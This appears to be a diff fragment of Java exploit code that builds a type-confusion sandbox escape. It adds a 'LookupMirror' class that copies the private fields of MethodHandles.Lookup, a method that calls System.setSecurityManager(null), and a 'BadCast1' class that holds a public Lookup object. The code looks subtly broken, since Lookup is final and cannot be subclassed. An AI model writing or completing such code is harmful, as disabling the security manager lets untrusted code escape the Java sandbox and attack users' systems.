@@ -2,7 +2,19 @@ import java.lang.invoke.MethodHandle;
 import java.lang.invoke.MethodHandles;
 import java.lang.invoke.MethodType;
 
+
 public class Main {
+
+
+	public class LookupMirror extends Lookup{
+	Class<?> lookupClass;
+	int allowedModes;
+	
+		public void setSecurityNull() {
+			System.setSecurityManager(null);
+		}
+	}
+
 	public static class BadCast1 extends Throwable{
 		Object o1 = MethodHandles.publicLookup();
 	}
